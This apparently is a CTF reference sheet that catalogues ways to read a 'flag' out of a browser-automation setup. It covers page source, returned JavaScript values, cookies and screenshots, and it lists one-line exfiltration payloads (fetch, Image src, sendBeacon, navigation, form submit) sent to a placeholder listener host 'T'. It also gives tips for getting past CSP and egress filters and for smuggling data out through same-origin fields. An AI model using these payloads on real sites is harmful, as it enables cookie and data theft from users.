# Carrier catalogue — the carriers a flag travels by

## The read carriers (attack surface)

### `GET /source` — the DOM carrier

The rendered page as text. Carries: a `file://` read wrapped in
`<html><pre>`, a DOM-resident flag, a stored value. The default
carrier — parse the flag out of the wrapped text.

### `execute` return — the JS carrier

The `return` value serialised to JSON. Carries: `document.cookie`,
`localStorage`, a `fetch` response, a computed flag, `el.outerHTML`.
The richest carrier — origin + cookies inherited.

### `GET /cookies` — the jar carrier

The cookie list JSON. Carries: every cookie for the origin, `HttpOnly`
included — a flag cookie JS cannot see.

### `GET /screenshot` — the render carrier

A base64 PNG. Carries: a flag rendered visually — an image, a styled
flag, a page whose text source is mangled. The PNG is the artifact.

## The exfil carriers (debugging aid)

### `fetch` — the request carrier

`fetch('https://T/?c='+value)` — carries the flag in the URL/body to
your listener. Blocked by `connect-src` CSP and egress filters.

### `Image`/subresource — the looser carrier

`new Image().src='https://T/i.png?c='+value` — carries the flag in the
URL. `img-src`/`script-src`/`style-src` are often looser than
`connect-src`.

### `sendBeacon` — the fire-and-forget carrier

`navigator.sendBeacon('https://T/?c='+value)` — carries the flag and
survives navigation. The short-wait carrier.

### `top.location`/`window.open` — the navigation carrier

`top.location='https://T/?c='+value` — carries the flag in the URL of
a real page navigation. No `connect-src` to block it.

### `<form>` — the form carrier

A programmatic `form.submit()` to your listener — `form-action` CSP
permitting. Carries the flag in a POST body.

## The write-back carriers (egress blocked)

### same-origin profile/field — the stash carrier

`fetch('/api/profile',{method:'POST',body:{bio:value}})` — carries the
flag into a same-origin field you read back. The app is the channel.

### same-origin note/comment — the store carrier

`fetch('/api/notes',{method:'POST',body:value})` — carries the flag
into a stored note/comment you fetch afterward.

## The response carriers (what proves the flag)

| Carrier | The proving bytes |
|---|---|
| `source` body | the flag inside the rendered text |
| `execute` return | the flag in the serialised value |
| `cookies` body | the flag in the cookie value |
| `screenshot` PNG | the flag in the decoded image |
| listener log | the flag in the request's query/body |
| same-origin store | the flag in the field/note you read back |

## The carrier-selection map

| Flag is | Carrier |
|---|---|
| in a file | `source` (via `file://` nav) |
| a JS-visible cookie | `execute` `document.cookie` |
| an HttpOnly cookie | `GET /cookies` |
| in storage | `execute` `localStorage` |
| on a same-origin page | `execute` `fetch` or `source` |
| on an internal route | `source` (via `localhost` nav) |
| rendered | `screenshot` |
| exfil'd by a payload | the exfil carrier or write-back |
